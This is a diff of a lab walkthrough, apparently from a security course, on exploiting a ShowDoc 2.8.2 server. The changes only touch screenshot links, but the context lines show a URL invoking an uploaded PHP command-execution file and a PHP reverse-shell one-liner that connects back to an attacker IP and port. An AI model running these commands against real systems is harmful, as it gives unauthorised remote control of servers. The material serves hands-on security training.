@@ -18,7 +18,6 @@
 
 After the target machine is started, access `http://your-ip:8080` to view the `ShowDoc` homepage.
 
-
 ![ShowDoc Homepage](https://static.nextcyber.cn/attachments/images/course/task/05bf4612360f422091c473237913544e.png)
 
 The target is a `ShowDoc 2.8.2` server.
@@ -106,8 +105,6 @@ Modify the `url` and access our uploaded remote command execution `php` file:
 http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
 ```
 
-![Execute command](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)
-
 As you can see, the `id` command was executed successfully.
 
 ## Reverse Shell
@@ -118,11 +115,11 @@ Use this [tool](https://www.revshells.com/) to generate a `php` `reverse shell` 
 php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
-![Generate reverse shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)
+![Generate reverse shell](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)
 
 Execute it directly on the webpage:
 
-![Execute reverse shell](https://static.nextcyber.cn/attachments/images/course/task/6afd4aa394684066b242477e95f55c42.png)
+![Execute reverse shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)
 
 Successfully obtained `shell`.
 
